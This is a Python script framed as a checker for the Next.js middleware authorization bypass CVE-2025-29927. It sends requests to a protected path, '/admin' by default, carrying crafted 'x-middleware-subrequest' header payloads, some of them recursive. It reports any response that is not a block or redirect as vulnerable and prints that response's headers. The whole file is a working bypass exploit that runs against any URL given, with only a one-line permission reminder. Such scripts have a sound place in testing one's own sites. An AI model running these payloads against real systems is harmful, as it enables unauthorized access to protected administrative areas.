import requests
import argparse

def check_nextjs_middleware_vulnerability(url, path):
    """
    Check for Next.js middleware vulnerability (CVE-2025-29927)
    
    Args:
        url (str): Base URL of the Next.js application
        path (str): Protected path to test
    """
    # Configurations to test based on different Next.js versions
    payloads = [
        # For versions prior to 12.2
        'pages/_middleware',
        
        # For versions 12.2 and after
        'middleware',
        'src/middleware',
        
        # For recent versions (recursive payload)
        'middleware:middleware:middleware:middleware:middleware',
        'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'
    ]

    print(f"🕵️ Checking {url} for Next.js Middleware Vulnerability (CVE-2025-29927)")

    for payload in payloads:
        try:
            # Send request with custom middleware subrequest header
            headers = {
                'x-middleware-subrequest': payload
            }
            
            # Allow redirects and accept all status codes
            response = requests.get(
                url + path, 
                headers=headers, 
                allow_redirects=True
            )

            print(f"\n🔍 Tested payload: {payload}")
            print(f"Status Code: {response.status_code}")
            print(f"Accessed URL: {response.url}")
            
            # Check if accessing a protected path that should have been blocked
            if response.status_code not in [403, 401, 302]:
                print(f"🚨 POTENTIAL VULNERABILITY DETECTED with payload: {payload}")
                print('The site might be vulnerable to middleware bypass!')
                
                # Additional details about the response
                print("Response Headers:")
                for header, value in response.headers.items():
                    print(f"{header}: {value}")
        
        except requests.RequestException as e:
            print(f"Error testing payload {payload}: {e}")

def main():
    # Set up argument parser
    parser = argparse.ArgumentParser(
        description='Check Next.js site for middleware vulnerability (CVE-2025-29927)',
        epilog='IMPORTANT: Only use on sites you own or have explicit permission to test!'
    )
    
    parser.add_argument(
        'url', 
        help='Base URL of the Next.js site (e.g., https://example.com)'
    )
    
    parser.add_argument(
        'path', 
        nargs='?', 
        default='/admin', 
        help='Protected path to test (default: /admin)'
    )

    # Parse arguments
    args = parser.parse_args()

    # Run vulnerability check
    check_nextjs_middleware_vulnerability(args.url, args.path)

if __name__ == "__main__":
    main()